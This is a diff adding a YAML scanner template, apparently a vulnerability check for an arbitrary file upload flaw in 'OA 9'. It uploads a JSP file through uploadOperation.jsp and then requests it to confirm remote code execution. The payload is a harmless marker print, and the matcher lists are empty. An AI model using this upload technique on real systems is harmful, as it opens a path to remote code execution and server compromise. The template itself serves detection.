@@ -1,0 +1,32 @@
+id: oa-v9-uploads-file
+brief:
+    title: OA 9 - Arbitrary File Upload
+    by: pikpikcu
+    level: high
+    about: OA 9 is susceptible to arbitrary file upload via the uploadOperation.jsp endpoint. These files can be subsequently called and are executed by the remote software, and an attacker can obtain sensiti...
+    label:
+        - rce
+        - jsp
+        - fileupload
+        - intrusive
+        - vuln
+    score: CVSS:8.8
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/page/exportImport/uploadOperation.jsp'
+      head:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
+        Origin: '{{Hostname}}'
+      body: |-
+        ------WebKitFormBoundaryFy3iNVBftjP6IOwo
+        Content-Disposition: form-data; name="file"; filename="poc.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.print(2be8e556fee1a876f10fa086979b8c7c);%>
+        ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/page/exportImport/fileTransfer/poc.jsp'
+      signs: []
